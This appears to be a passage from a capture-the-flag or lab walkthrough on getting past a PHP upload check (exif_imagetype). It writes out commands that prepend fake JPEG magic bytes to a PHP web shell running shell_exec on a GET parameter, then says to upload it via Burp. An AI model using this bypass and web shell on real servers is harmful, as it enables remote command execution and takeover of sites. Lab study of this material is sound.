exif_imagetype($_FILES['uploadedfile']['tmp_name'])
this line in the php script above will check if the given file has valid header.
It checks whether the uploaded file is a valid image, based on its magic bytes (i.e., the file signature), not just its extension.
So now, just changing the file extension to .php wonâ€™t work.


We can put fake jpeg headed onto php script to bypass this filter.

# Create fake JPEG header (FF D8 FF E0)
echo -ne '\xFF\xD8\xFF\xE0' > shell.php

# Append your PHP payload
echo "<?php echo shell_exec(\$_GET['cmd']); ?>" >> shell.php

Upload the shell.php and also change the line in the request like how we did in the previous level using burp.
